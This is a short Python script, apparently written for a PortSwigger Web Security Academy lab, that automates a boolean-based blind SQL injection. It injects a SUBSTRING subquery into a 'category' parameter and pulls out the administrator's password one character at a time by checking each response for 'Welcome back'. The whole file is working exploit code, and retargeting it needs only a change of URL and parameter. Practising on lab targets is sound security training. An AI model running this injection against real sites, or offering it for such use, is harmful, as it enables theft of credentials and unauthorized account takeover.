import requests
import string
# This script is used to brute force on blind SQL injections when the injection is off of the parameters
# Base URL and headers for the request
base_url = "https://0a67005c039091b281fd3bfa004300e3.web-security-academy.net/filter"
headers = {"User-Agent": "Mozilla/5.0"}
characters = string.ascii_lowercase + string.digits

def brute_force_password():
    password = ""
    position = 1
    while True:
        found = False
        for char in characters:
            params = {"category": f"Accessories' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),{position},1)='{char}"}
            response = requests.get(base_url, headers=headers, params=params)
            if "Welcome back" in response.text:
                password += char
                print(f"Character found: {char}")
                found = True
                break
        if not found:
            print("Password fully discovered!")
            break
        position += 1
    print(f"Password: {password}")

if __name__ == "__main__":
    brute_force_password()
